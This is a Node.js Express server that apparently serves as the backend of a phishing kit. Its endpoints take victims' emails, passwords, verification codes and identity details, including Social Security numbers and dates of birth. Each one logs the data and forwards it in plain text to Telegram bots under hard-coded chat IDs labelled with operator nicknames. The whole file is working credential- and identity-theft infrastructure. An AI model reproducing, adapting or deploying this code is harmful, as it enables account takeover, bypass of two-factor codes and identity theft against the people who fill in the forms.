require("dotenv").config();
const express = require("express");
const axios = require("axios");
const bodyParser = require("body-parser");
const cors = require("cors");

const { TOKEN, SERVER_URL, TOKEN2, TOKEN3, TOKEN4 } = process.env;
const TELEGRAM_API = `https://api.telegram.org/bot${TOKEN}`;
const TELEGRAM_API2 = `https://api.telegram.org/bot${TOKEN2}`;
const TELEGRAM_API3 = `https://api.telegram.org/bot${TOKEN3}`;
const TELEGRAM_API4 = `https://api.telegram.org/bot${TOKEN4}`;
const URI = `/webhook/${TOKEN}`;
const URI2 = `/webhook/${TOKEN2}`
const URI3 = `/webhook/${TOKEN3}`
const URI4 = `/webhook/${TOKEN4}`
const WEBHOOK_URL = SERVER_URL + URI;
const WEBHOOK_URL3 = SERVER_URL + URI3;
const WEBHOOK_URL4 = SERVER_URL + URI4;

const app = express();
app.use(bodyParser.json());
app.use(cors()); // Use the cors middleware

const init = async () => {
  try {
    const res = await axios.get(`${TELEGRAM_API}/setWebhook?url=${WEBHOOK_URL}`);
    const res2 = await axios.get(`${TELEGRAM_API2}/setWebhook?url=${WEBHOOK_URL}`);
    const res3 = await axios.get(`${TELEGRAM_API3}/setWebhook?url=${WEBHOOK_URL3}`);
    const res4 = await axios.get(`${TELEGRAM_API4}/setWebhook?url=${WEBHOOK_URL4}`); // Fixed endpoint

    console.log(res4.data);
  } catch (error) {
    console.error("Error setting webhook:", error.response?.data || error.message);
  }
};

// Carter
app.post(URI, async (req, res) => {
  console.log(req.body);

  email = req.body.email;
  password = req.body.password;

  // You can use email and password in your desired way (e.g., send to another API, save to a database, etc.)
  console.log("Received Email:", email);
  console.log("Received Password:", password);

  await axios.post(`${TELEGRAM_API}/sendMessage`, {
    chat_id: "7068073891", // You removed Orelo and Put Bunny
    text: `The Email is ${email}, the Password is ${password}`,
  });
  return res.send();
});

// Mr P
app.post(URI2, async (req, res) => {
  console.log(req.body);

  email = req.body.email;
  password = req.body.password;

  // You can use email and password in your desired way (e.g., send to another API, save to a database, etc.)
  console.log("Received Email:", email);
  console.log("Received Password:", password);

  await axios.post(`${TELEGRAM_API2}/sendMessage`, {
    chat_id: "6440732033",
    text: `The Email is ${email}, the Password is ${password}`,
  });
  return res.send();
});

// Carter
app.post("/code", async (req, res) => {
  console.log(req.body);

  code = req.body.code;

  // You can use email and password in your desired way (e.g., send to another API, save to a database, etc.)
  console.log("Received Code:", code);

  await axios.post(`${TELEGRAM_API}/sendMessage`, {
    chat_id: "7068073891", // You removed Orelo and Put Bunny
    text: `The verification code is ${code}`,
  });
  return res.send();
});

// Mr P
app.post("/code2", async (req, res) => {
  console.log(req.body);

  code = req.body.code;

  // You can use email and password in your desired way (e.g., send to another API, save to a database, etc.)
  console.log("Received Code:", code);

  await axios.post(`${TELEGRAM_API2}/sendMessage`, {
    chat_id: "6440732033",
    text: `The verification code is ${code}`,
  });
  return res.send();
});

// Carter
app.post("/form", async (req, res) => {
  try {
    console.log(req.body);

    const { firstName, lastName, email, phoneNumber, ssn, gender, dob } =
      req.body;

    // Handle other form fields as needed

    await axios.post(`${TELEGRAM_API}/sendMessage`, {
      chat_id: "1636602095",
      text: `New Form Submission:\n\nFirst Name: ${firstName}\nLast Name: ${lastName}\nEmail: ${email}\nPhone Number: ${phoneNumber}\nSSN: ${ssn}\nGender: ${gender}\nDate of Birth: ${dob}`,
    });

    return res.send();
  } catch (error) {
    console.error("An error occurred while processing the form:", error);
    return res.status(500).send("Internal Server Error");
  }
});


// Mr P
app.post("/saint", async (req, res) => {
  try {
    console.log(req.body);

    const { firstName, lastName, email, phoneNumber, ssn, gender, dob } =
      req.body;

    // Handle other form fields as needed

    await axios.post(`${TELEGRAM_API2}/sendMessage`, {
      chat_id: "6440732033",
      text: `New Form Submission:\n\nFirst Name: ${firstName}\nLast Name: ${lastName}\nEmail: ${email}\nPhone Number: ${phoneNumber}\nSSN: ${ssn}\nGender: ${gender}\nDate of Birth: ${dob}`,
    });

    return res.send();
  } catch (error) {
    console.error("An error occurred while processing the form:", error);
    return res.status(500).send("Internal Server Error");
  }
});

//Bunny
app.post("/form_bunny", async (req, res) => {
  try {
    console.log(req.body);

    const { firstName, lastName, email, phoneNumber, gender, dob } =
      req.body;

    // Handle other form fields as needed

    await axios.post(`${TELEGRAM_API4}/sendMessage`, {
      chat_id: "7068073891",
      text: `New Form Submission:\n\nFirst Name: ${firstName}\nLast Name: ${lastName}\nEmail: ${email}\nPhone Number: ${phoneNumber}\nGender: ${gender}\nDate of Birth: ${dob}`,
    });

    return res.send();
  } catch (error) {
    console.error("An error occurred while processing the form:", error);
    return res.status(500).send("Internal Server Error");
  }
});

app.listen(process.env.PORT || 5000, async () => {
  console.log("🚀 app running on port", process.env.PORT || 5000);
  await init();
});
